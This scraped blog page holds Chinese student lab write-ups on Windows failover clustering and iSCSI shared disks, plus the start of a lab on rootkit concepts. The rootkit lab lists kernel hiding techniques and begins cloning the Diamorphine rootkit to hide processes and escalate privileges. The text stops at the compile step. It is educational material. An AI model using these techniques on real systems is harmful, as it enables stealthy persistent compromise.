<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120002822278-1733186553294-36.png" class="" title="image-20241120002822278">
</li>
<li><p>安装完成后，系统可能提示需要重启，按照提示重启服务器。 </p>
</li>
</ul>
</li>
<li><p><strong>在 Node B 上安装故障转移群集功能</strong>：</p>
<ul>
<li>按照与 Node A 相同的步骤安装故障转移群集功能。 </li>
</ul>
</li>
<li><p><strong>修改注册表设置</strong>：</p>
<ul>
<li><p>在 Node A 和 Node B 上，按下 <code>Win + R</code>，输入 <code>regedit</code>，打开注册表编辑器。 </p>
</li>
<li><p>导航到以下路径： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</span><br></pre></td></tr></table></figure>
</li>
<li><p>右键点击右侧空白处，选择“新建”&gt;“DWORD（32 位）值”，命名为 <code>LocalAccountTokenFilterPolicy</code>。 </p>
</li>
<li><p>双击新建的键值，将数值数据设置为 <code>1</code>，然后点击“确定”。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120003521751-1733186553294-37.png" class="" title="image-20241120003521751">
</li>
</ul>
</li>
<li><p><strong>创建群集</strong>：</p>
<ul>
<li><p>在 Node A 上，打开“故障转移群集管理器”。 </p>
</li>
<li><p>在右侧的“管理”下，选择“创建群集”。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120003741756-1733186553294-38.png" class="" title="image-20241120003741756">
</li>
<li><p>在“开始之前”页面，点击“下一步”。 </p>
</li>
<li><p>在“选择服务器”页面，输入 <code>Node A</code> 和 <code>Node B</code> 的名称，点击“添加”，然后点击“下一步”。 </p>
</li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120095053789-1733186553294-39.png" class="" title="image-20241120095053789">
</li>
<li><p>在“验证访问点”页面，输入群集名称（如：<code>moyuan</code>），并指定群集 IP 地址，然后点击“下一步”。</p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105702906-1733186553294-40.png" class="" title="image-20241120105702906"> 
</li>
<li><p>在“确认”页面，检查配置无误后，点击“下一步”开始创建群集。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105742243-1733186553294-41.png" class="" title="image-20241120105742243">
</li>
<li><p>创建完成后，点击“完成”。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105840347-1733186553295-42.png" class="" title="image-20241120105840347">
</li>
</ul>
</li>
<li><p><strong>验证群集状态</strong>：</p>
<ul>
<li><p>在“故障转移群集管理器”中，查看群集节点的状态，确保 <code>Node A</code> 和 <code>Node B</code> 都处于“联机”状态。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105914516-1733186553295-43.png" class="" title="image-20241120105914516">
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105935617-1733186553295-45.png" class="" title="image-20241120105935617">
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120110007789-1733186553295-44.png" class="" title="image-20241120110007789">
</li>
<li><p>在“存储”下，查看共享磁盘的状态，确保其已被群集识别并处于“联机”状态。 至此，实验成功完成。</p>
</li>
</ul>
</li>
</ol>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a><strong>实验总结</strong></h2><h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a><strong>知识点总结</strong></h3><ol>
<li><p><strong>MSCS 组成</strong>：</p>
<ul>
<li><strong>群集服务</strong>：提供高可用性支持。 </li>
<li><strong>资源监视器</strong>：实时监控资源状态。 </li>
<li><strong>资源 DLL</strong>：实现资源管理逻辑。 </li>
</ul>
</li>
<li><p><strong>故障转移功能</strong>：</p>
<ul>
<li>通过冗余机制实现高可用性。应用程序在任一节点上运行，出现故障时可在其他节点上重启。 </li>
</ul>
</li>
<li><p><strong>容错 vs 高可用性</strong>：</p>
<ul>
<li>MSCS 提供的是“高可用性”，而非真正的容错功能。 </li>
</ul>
<h3 id="反思总结"><a href="#反思总结" class="headerlink" title="反思总结"></a><strong>反思总结</strong></h3></li>
</ol>
<ul>
<li><p><strong>常见问题及解决方案</strong>：</p>
<ol>
<li><strong>系统版本差异导致功能缺失</strong>：安装 Windows Server 2019。 </li>
<li><strong>域服务器 SID 冲突</strong>：避免克隆，重新创建虚拟机。 (可以重置SID)</li>
<li><strong>Master 节点权限问题</strong>：使用 <code>Administrator</code> 账户登录。 </li>
<li>节点公网网卡“public”，首选DNS应指向master节点</li>
</ol>
<p>通过本次实验，掌握了 MSCS 的配置方法，理解了群集的概念及其运作机制。 </p>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/" class="post-title-link" itemprop="url">Windows Server 群集环境下的部署操作</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-21 14:31:34" itemprop="dateCreated datePublished" datetime="2024-11-21T14:31:34+08:00">2024-11-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-12-03 08:46:06" itemprop="dateModified" datetime="2024-12-03T08:46:06+08:00">2024-12-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Windows-Server-群集环境下的部署操作"><a href="#Windows-Server-群集环境下的部署操作" class="headerlink" title="Windows Server 群集环境下的部署操作"></a>Windows Server 群集环境下的部署操作</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul>
<li>学习在 Windows Server 群集环境下的部署操作。</li>
<li>掌握共享磁盘的设计与应用。</li>
</ul>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
<li><strong>操作系统</strong>：Windows Server 2019</li>
<li><strong>实验工具</strong>：FreeNAS</li>
</ul>
<h2 id="实验过程与分析"><a href="#实验过程与分析" class="headerlink" title="实验过程与分析"></a>实验过程与分析</h2><h3 id="一、虚拟机安装与配置"><a href="#一、虚拟机安装与配置" class="headerlink" title="一、虚拟机安装与配置"></a>一、虚拟机安装与配置</h3><ol>
<li><p><strong>安装与克隆</strong>：</p>
<ul>
<li><p>下载 Windows Server 2019 的镜像文件。</p>
</li>
<li><p>安装并配置一台主机 (Master) 后，克隆两个相同的虚拟机节点。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112084901967-1733186736398-1.png" class="" title="image-20241112084901967">
</li>
<li><p>克隆方式为选择“克隆全部内容”。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112085502663-1733186736398-2.png" class="" title="image-20241112085502663">
</li>
</ul>
</li>
<li><p><strong>配置网络适配器</strong>：</p>
<ul>
<li><p><strong>NodeA</strong>和<strong>NodeB</strong>的网卡适配器设置如下：</p>
<ul>
<li><p>适配器 1：设为“仅主机模式”。</p>
</li>
<li><p>适配器 2：设为“NAT”模式。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112085924208-1733186736398-4.png" class="" title="image-20241112085924208">
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="二、群集环境部署"><a href="#二、群集环境部署" class="headerlink" title="二、群集环境部署"></a>二、群集环境部署</h3><ol>
<li><p><strong>账户配置</strong>：</p>
<ul>
<li><p>同时启动 NodeA 和 NodeB。</p>
</li>
<li><p>进入 NodeA 的控制面板，调整账户名称为“nodeA”，NodeB 做相应设置。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112090616213-1733186736398-3.png" class="" title="image-20241112090616213">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112090741343-1733186736398-5.png" class="" title="image-20241112090741343">
</li>
</ul>
</li>
<li><p><strong>防火墙关闭</strong>：</p>
<ul>
<li><p>在每个节点上关闭防火墙。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091309461-1733186736398-6.png" class="" title="image-20241112091309461">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091533092-1733186736398-7.png" class="" title="image-20241112091533092">
</li>
</ul>
</li>
<li><p><strong>网络配置</strong>：</p>
<ul>
<li><p>进入网络和共享中心，调整网络适配器：</p>
<ul>
<li><strong>内网网卡</strong>设置为“Private”。</li>
<li><strong>外网网卡</strong>设置为“Public”（最好用已连接网络的设置为public)。</li>
</ul>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091657493-1733186736399-8.png" class="" title="image-20241112091657493">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092240766-1733186736399-9.png" class="" title="image-20241112092240766">
</li>
<li><p>配置心跳网卡和公网网卡的 IP 地址和子网掩码</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092516561-1733186736399-10.png" class="" title="image-20241112092516561">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092758227-1733186736399-11.png" class="" title="image-20241112092758227">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092817918-1733186736399-12.png" class="" title="image-20241112092817918">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092902919-1731374944717-1-1733186736399-13.png" class="" title="image-20241112092902919">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092953871-1733186736399-14.png" class="" title="image-20241112092953871">
<p>右键公网网卡“public”，配置ip地址及子网掩码，首选DNS指向master节点。</p>
<p>首先查看自动分配的IP</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241128035442121.png" class="" title="image-20241128035442121">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241128035547570.png" class="" title="image-20241128035547570">
<p>同理配置另一节点</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241128040201315.png" class="" title="image-20241128040201315">
</li>
<li><p>在 NodeB 上通过 <code>ping</code> 指令测试与 NodeA 的连通性，以确保节点互通。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241128040631177.png" class="" title="image-20241128040631177">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112100124326-1733186736399-15.png" class="" title="image-20241112100124326">
</li>
</ul>
</li>
</ol>
<h3 id="三、共享磁盘的配置"><a href="#三、共享磁盘的配置" class="headerlink" title="三、共享磁盘的配置"></a>三、共享磁盘的配置</h3><ol>
<li><p><strong>iSCSI 配置</strong>：</p>
<ul>
<li><p>在 NodeA 上启动 Windows Server 2019 自带的 iSCSI 发起程序。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094515268-1733186736399-16.png" class="" title="image-20241112094515268">
</li>
<li><p>输入 FreeNAS 的 IP 地址，进行快速连接。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094554062-1733186736399-17.png" class="" title="image-20241112094554062">
</li>
</ul>
</li>
<li><p><strong>磁盘管理</strong>：</p>
<ul>
<li><p>进入计算机管理中的磁盘管理，将 iSCSI 磁盘设为联机状态。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094723629-1733186736399-18.png" class="" title="image-20241112094723629">
</li>
<li><p>在“此电脑”中查看共享磁盘是否可见。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095154638-1733186736399-19.png" class="" title="image-20241112095154638">
</li>
</ul>
</li>
<li><p><strong>NodeB 的配置</strong>：</p>
<ul>
<li><p>在 NodeB 上重复 NodeA 的磁盘联机步骤，无需关闭 NodeA。</p>
</li>
<li><p>至此，共享磁盘环境配置完成。</p>
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095452487-1733186736399-20.png" class="" title="image-20241112095452487">
<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095554706-1733186736399-21.png" class="" title="image-20241112095554706">
</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">计算机系统分层设计与Rootkit概念及实现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-11-21 14:27:51 / 修改时间：14:30:03" itemprop="dateCreated datePublished" datetime="2024-11-21T14:27:51+08:00">2024-11-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="💻-计算机系统分层设计-与-🐛Rootkit-概念及实现"><a href="#💻-计算机系统分层设计-与-🐛Rootkit-概念及实现" class="headerlink" title="💻 计算机系统分层设计 与 🐛Rootkit 概念及实现"></a>💻 计算机系统分层设计 与 🐛Rootkit 概念及实现</h3><h4 id="🧪-实验问题-1"><a href="#🧪-实验问题-1" class="headerlink" title="🧪 实验问题 1"></a>🧪 实验问题 1</h4><h5 id="简述-💻-计算机系统-中的分层设计理念及相关应用举例"><a href="#简述-💻-计算机系统-中的分层设计理念及相关应用举例" class="headerlink" title="简述 💻 计算机系统 中的分层设计理念及相关应用举例"></a><strong>简述 💻 计算机系统 中的分层设计理念及相关应用举例</strong></h5><h5 id="🎯-实验目的"><a href="#🎯-实验目的" class="headerlink" title="🎯 实验目的"></a><strong>🎯 实验目的</strong></h5><ol>
<li>理解 💻 计算机系统 分层设计理念及其重要性。</li>
<li>学习 分层设计 在 💻 计算机系统 中的典型应用。</li>
</ol>
<h5 id="📝-实验内容"><a href="#📝-实验内容" class="headerlink" title="📝 实验内容"></a><strong>📝 实验内容</strong></h5><p>分层设计 是一种将复杂系统划分为若干层次的设计方法，每层专注于特定的功能或抽象级别，向上提供服务，向下请求服务。这种设计理念使得系统模块化、易于维护和扩展。</p>
<p><strong>分层设计的特点：</strong></p>
<ol>
<li><strong>模块化</strong>：每一层可以独立开发和测试。</li>
<li><strong>易于扩展</strong>：新增功能仅需在相应层中进行。</li>
<li><strong>维护性强</strong>：局部修改不会影响其他层。</li>
</ol>
<p><strong>典型应用：</strong></p>
<ol>
<li><p><strong>操作系统</strong>：</p>
<ul>
<li>🖥️ 操作系统 采用分层设计，从硬件到用户程序通常分为硬件层、内核层、系统调用接口层、用户层等。</li>
<li><strong>实例</strong>：📂 文件系统 位于内核层，它抽象出文件管理功能，向上层屏蔽了硬件存储设备的细节。</li>
</ul>
</li>
<li><p><strong>网络协议栈</strong>：</p>
<ul>
<li>🌐 OSI 七层模型 是网络通信领域的分层设计典范，将通信过程划分为物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。</li>
<li><strong>实例</strong>：📨 HTTP 位于应用层，它依赖于传输层（如 📦 TCP 协议）进行数据传输。</li>
</ul>
</li>
</ol>
<h4 id="🧪-实验问题-2"><a href="#🧪-实验问题-2" class="headerlink" title="🧪 实验问题 2"></a>🧪 实验问题 2</h4><h5 id="简述-🐛-Rootkit-的相关定义，以及-🐛-Rootkit-的类型"><a href="#简述-🐛-Rootkit-的相关定义，以及-🐛-Rootkit-的类型" class="headerlink" title="简述 🐛 Rootkit 的相关定义，以及 🐛 Rootkit 的类型"></a><strong>简述 🐛 Rootkit 的相关定义，以及 🐛 Rootkit 的类型</strong></h5><h5 id="🎯-实验目的-1"><a href="#🎯-实验目的-1" class="headerlink" title="🎯 实验目的"></a><strong>🎯 实验目的</strong></h5><ol>
<li>掌握 🐛 Rootkit 的概念及特点。</li>
<li>理解 🐛 Rootkit 的分类及其应用场景。</li>
</ol>
<h5 id="📝-实验内容-1"><a href="#📝-实验内容-1" class="headerlink" title="📝 实验内容"></a><strong>📝 实验内容</strong></h5><p><strong>🐛 Rootkit 定义：</strong></p>
<p>Rootkit 是一种具有高隐蔽性的软件工具，通常用于隐藏自身或其他恶意活动。它常与 🐎 木马、🔙 后门 等恶意程序结合，通过修改操作系统的核心部分达到隐藏和长期驻留的目的。</p>
<p><strong>🐛 Rootkit 特点：</strong></p>
<ol>
<li>🔍 高隐蔽性：隐藏 📂 文件、📋 进程、📡 端口 等。</li>
<li>🔄 高持久性：通过多种手段维持对系统的控制权。</li>
<li>⚠️ 低检测率：传统杀毒软件难以发现。</li>
</ol>
<p><strong>🐛 Rootkit 类型：</strong></p>
<ol>
<li><p><strong>用户态 Rootkit</strong>：</p>
<ul>
<li>运行在用户空间。</li>
<li>替换系统 API 或劫持系统调用返回值。</li>
<li><strong>应用场景</strong>：💸 大面积勒索或挖矿木马。</li>
</ul>
</li>
<li><p><strong>内核态 Rootkit</strong>：</p>
<ul>
<li>运行在内核空间。</li>
<li>修改系统内核数据结构或挂钩内核函数。</li>
<li><strong>应用场景</strong>：高级持续性威胁（APT）。</li>
</ul>
</li>
<li><p><strong>硬件态 Rootkit</strong>：</p>
<ul>
<li>植入硬件层或引导扇区。</li>
<li>在系统启动前获得控制权。</li>
<li><strong>应用场景</strong>：高隐蔽性、定向攻击。</li>
</ul>
</li>
</ol>
<p><strong>🐛 Rootkit 的常见隐藏技术：</strong></p>
<ol>
<li><p><strong>程序替换</strong>：</p>
<ul>
<li><strong>LD_PRELOAD</strong>：通过预加载动态链接库，直接替换原始程序。</li>
<li><strong>Ring3</strong>：在用户空间执行，属于用户态 Rootkit 的一种常用方法。</li>
</ul>
</li>
<li><p><strong>端口隐藏</strong>：</p>
<ul>
<li><strong>eBPF</strong>：通过 kprobes/uprobes/tracepoint 等操作在内核中插入钩子，以隐藏特定的端口。</li>
<li><strong>Netfilter Hook</strong>：使用 Netfilter 框架的钩子功能来过滤特定网络数据包，隐藏端口信息。</li>
</ul>
</li>
<li><p><strong>网络连接隐藏</strong>：</p>
<ul>
<li><strong>VFS Hook</strong>：Hook <code>tcp4_seq_show</code> 函数，过滤 <code>/proc/net/tcp</code> 目录中特定内容，隐藏特定的网络连接。</li>
<li><strong>eBPF</strong>：通过在内核中设置钩子来过滤网络连接。</li>
<li><strong>Netfilter Hook</strong>：Hook Netfilter Callback Function Register，拦截网络数据包，隐藏相关连接信息。</li>
</ul>
</li>
<li><p><strong>进程隐藏</strong>：</p>
<ul>
<li><strong>VFS Hook</strong>：通过 Hook <code>filldir64/readdir</code> 函数，过滤 <code>/proc/PID</code> 目录中文件内容，从而隐藏进程。</li>
<li><strong>Syscall Hook</strong>：通过 Hook <code>Sys_getdents</code>/<code>Sys_getdents64</code> 系统调用函数，隐藏 <code>/proc/PID</code> 目录中文件信息。</li>
<li><strong>eBPF</strong>：在内核中设置 tracepoint 钩子，过滤操作，从而隐藏进程。</li>
</ul>
</li>
<li><p><strong>文件隐藏</strong>：</p>
<ul>
<li><strong>VFS Hook</strong>：Hook <code>filldir64/readdir</code> 函数，过滤特定目录中的文件。</li>
<li><strong>eBPF</strong>：通过在内核设置 tracepoint 钩子，隐藏文件内容。</li>
</ul>
</li>
<li><p><strong>内核模块隐藏</strong>：</p>
<ul>
<li><strong>模块链表操作</strong>：<ul>
<li>通过修改 <code>kernel module</code> 链表结构，将目标模块从链表中移除，从而实现隐藏。</li>
<li>Hook <code>list_del_init</code> 函数或通过 <code>kobject</code> 操作来修改内核模块链表结构，使模块不被显示。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>这些技术手段通过对内核或用户空间的相关接口进行劫持或修改，能够有效地实现对📋 进程、📡 端口、📂 文件等系统资源的隐藏，达到了 🐛 Rootkit 的高隐蔽性要求。</p>
<h4 id="🧪-实验问题-3"><a href="#🧪-实验问题-3" class="headerlink" title="🧪 实验问题 3"></a>🧪 实验问题 3</h4><h5 id="通过资料检索，了解-🐛-Rootkit-的具体实现，并尝试实现一个简单的-🐛-Rootkit"><a href="#通过资料检索，了解-🐛-Rootkit-的具体实现，并尝试实现一个简单的-🐛-Rootkit" class="headerlink" title="通过资料检索，了解 🐛 Rootkit 的具体实现，并尝试实现一个简单的 🐛 Rootkit"></a><strong>通过资料检索，了解 🐛 Rootkit 的具体实现，并尝试实现一个简单的 🐛 Rootkit</strong></h5><p><strong>📝 实验名称</strong></p>
<p>🐛 Rootkit 实验与提权演示</p>
<p><strong>🎯 实验目的</strong></p>
<p>通过本次实验，掌握 🐛 Rootkit 的基本使用方法，学习如何在 🐧 Linux 系统中利用 🐛 Rootkit 实现 📋 进程隐藏、内核模块隐藏以及普通用户提权的操作。</p>
<p><strong>🖥️ 实验环境</strong></p>
<ul>
<li><strong>操作系统</strong>: 🐧 CentOS 7.9</li>
<li><strong>🐛 Rootkit 工具</strong>: Diamorphine</li>
</ul>
<p><strong>📝 实验步骤</strong></p>
<h5 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h5><p><strong>(1) 克隆 Diamorphine 代码库</strong></p>
<p>使用如下命令克隆 Diamorphine 的代码库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/m0nad/Diamorphine</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241120233151162.png" class="" title="image-20241120233151162">
<p><strong>(2) 进入目录并编译模块</strong></p>
<p>进入克隆的 Diamorphine 目录，使用 <code>make</code> 命令进行编译：</p>
